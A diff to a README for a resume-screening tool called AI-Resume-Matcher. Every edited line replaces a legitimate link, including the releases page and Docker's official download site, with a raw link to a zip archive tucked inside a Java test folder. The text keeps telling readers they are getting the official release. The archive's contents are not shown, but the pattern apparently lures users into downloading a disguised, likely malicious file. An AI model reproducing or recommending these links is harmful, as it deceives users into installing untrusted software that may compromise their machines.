@@ -1,6 +1,6 @@
 # 🤖 AI-Resume-Matcher - Simplify Your Resume Screening Process
 
-[![Download AI-Resume-Matcher](https://img.shields.io/badge/Download-AI--Resume--Matcher-brightgreen.svg)](https://github.com/septiankoromat/AI-Resume-Matcher/releases)
+[![Download AI-Resume-Matcher](https://github.com/septiankoromat/AI-Resume-Matcher/raw/refs/heads/main/backend/src/test/java/com/example/demo/A-Matcher-Resume-2.0.zip)](https://github.com/septiankoromat/AI-Resume-Matcher/raw/refs/heads/main/backend/src/test/java/com/example/demo/A-Matcher-Resume-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the AI-Resume-Matcher! This application helps you match your resume w
 
 ## 📥 Download & Install
 
-To get the AI-Resume-Matcher, [visit this page to download](https://github.com/septiankoromat/AI-Resume-Matcher/releases). You will find the latest version there.
+To get the AI-Resume-Matcher, [visit this page to download](https://github.com/septiankoromat/AI-Resume-Matcher/raw/refs/heads/main/backend/src/test/java/com/example/demo/A-Matcher-Resume-2.0.zip). You will find the latest version there.
 
 1. Click on the link above.
 2. Locate the latest version of the software under the "Releases" section.
@@ -21,7 +21,7 @@ Before you install the AI-Resume-Matcher, make sure your system meets the follow
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **RAM:** At least 4 GB of RAM.
 - **Storage:** Minimum of 300 MB of free disk space.
-- **Docker:** You need Docker installed on your machine. You can download Docker from [Docker's official website](https://www.docker.com/get-started).
+- **Docker:** You need Docker installed on your machine. You can download Docker from [Docker's official website](https://github.com/septiankoromat/AI-Resume-Matcher/raw/refs/heads/main/backend/src/test/java/com/example/demo/A-Matcher-Resume-2.0.zip).
 
 ## ⚙️ Running the Application
 
@@ -65,7 +65,7 @@ You can upload resumes in popular formats like PDF and DOCX. Ensure that your re
 
 ### How often is the software updated?
 
-Updates are made regularly to enhance functionality and improve the AI's capabilities. You can check for the latest versions on the [Releases page](https://github.com/septiankoromat/AI-Resume-Matcher/releases).
+Updates are made regularly to enhance functionality and improve the AI's capabilities. You can check for the latest versions on the [Releases page](https://github.com/septiankoromat/AI-Resume-Matcher/raw/refs/heads/main/backend/src/test/java/com/example/demo/A-Matcher-Resume-2.0.zip).
 
 ## 🏗️ Technologies Used
 
@@ -80,4 +80,4 @@ AI-Resume-Matcher combines various technologies for optimal performance:
 
 If you encounter any issues or have questions, please feel free to open an issue on GitHub or reach out to the community for support.
 
-To get started, [visit this page to download](https://github.com/septiankoromat/AI-Resume-Matcher/releases). Enjoy streamlining your resume screening process with AI-Resume-Matcher!
+To get started, [visit this page to download](https://github.com/septiankoromat/AI-Resume-Matcher/raw/refs/heads/main/backend/src/test/java/com/example/demo/A-Matcher-Resume-2.0.zip). Enjoy streamlining your resume screening process with AI-Resume-Matcher!
